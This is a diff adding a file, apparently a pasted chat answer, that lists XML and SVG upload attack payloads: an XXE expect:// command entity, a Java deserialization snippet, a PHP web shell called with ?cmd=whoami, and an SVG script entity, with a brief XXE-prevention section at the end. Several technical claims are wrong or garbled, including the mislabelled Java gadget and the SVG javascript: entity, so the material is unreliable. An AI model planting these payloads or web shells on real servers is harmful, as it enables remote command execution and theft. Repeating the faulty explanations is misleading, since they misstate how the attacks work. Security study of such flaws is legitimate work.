@@ -1,0 +1,89 @@
+1. XXE-Based XML File Upload RCE
+Scenario:
+A web application allows users to upload XML files. The backend parses the XML without disabling external entities, allowing an attacker to execute commands on the server.
+
+Malicious XML Payload (Injecting System Commands)
+xml
+Copy
+Edit
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "expect://id">
+]>
+<root>
+  <command>&xxe;</command>
+</root>
+How it Works:
+The expect:// wrapper (in PHP) executes system commands (id in this case).
+If the XML is parsed using system(), exec(), or similar functions, it can execute arbitrary OS commands.
+2. XML Injection via Unsafe Deserialization
+Scenario:
+A web application uploads XML files and deserializes them using Python, Java, or PHP object deserialization, leading to RCE.
+
+Malicious XML Payload for Java Deserialization (Apache Commons Collections Exploit)
+xml
+Copy
+Edit
+<?xml version="1.0"?>
+<map>
+    <entry>
+        <jdk.nashorn.internal.objects.NativeString>
+            <value>calc</value>
+        </jdk.nashorn.internal.objects.NativeString>
+        <string>Runtime.getRuntime().exec(value);</string>
+    </entry>
+</map>
+How it Works:
+If the server deserializes XML using Java deserialization, it could trigger Runtime.getRuntime().exec("calc"), opening Calculator (or any command).
+3. Malicious XML File Upload Leading to PHP Code Execution
+Scenario:
+Some servers allow uploading XML files, but then process them as PHP files due to misconfigured MIME types.
+
+Payload (PHP Web Shell in an XML File)
+xml
+Copy
+Edit
+<?xml version="1.0"?>
+<root>
+  <data><![CDATA[<?php system($_GET['cmd']); ?>]]></data>
+</root>
+How it Works:
+The attacker uploads the XML file as shell.xml.
+If the server does not enforce strict MIME types, the attacker renames it to shell.php or tricks the server into executing it.
+The attacker accesses:
+bash
+Copy
+Edit
+http://example.com/uploads/shell.php?cmd=whoami
+This executes whoami and returns the result.
+4. SVG File Upload Leading to JavaScript Execution
+Scenario:
+Some applications allow SVG uploads (which are XML-based). Attackers inject malicious JavaScript inside the SVG file.
+
+Malicious SVG Payload for XSS & Potential RCE
+xml
+Copy
+Edit
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "javascript:alert('Hacked!')">
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text>&xxe;</text>
+</svg>
+How it Works:
+When the victim opens the uploaded SVG, it executes JavaScript, potentially leading to cookie theft or further exploitation.
+How to Prevent XML File Upload RCE
+✅ Disable External Entity Processing (XXE Prevention)
+
+PHP (libxml_disable_entity_loader)
+php
+Copy
+Edit
+libxml_disable_entity_loader(true);
+Java (SAX Parser)
+java
+Copy
+Edit
+factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
+factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
